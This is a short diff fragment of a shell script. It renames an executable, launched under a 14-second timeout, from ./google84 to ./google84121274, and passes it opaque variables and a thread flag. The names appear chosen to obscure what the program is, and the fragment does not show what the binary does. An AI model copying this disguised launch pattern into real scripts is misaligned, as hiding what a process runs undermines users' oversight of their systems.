@@ -46,7 +46,7 @@ googlelinux84=$(echo "$count / 16384"|bc -l)
 linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
 googlelinux8474=${linuxgoogle84%.*}
 
-timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 if [ $? -eq 124 ]; then
 echo "google84"
 else
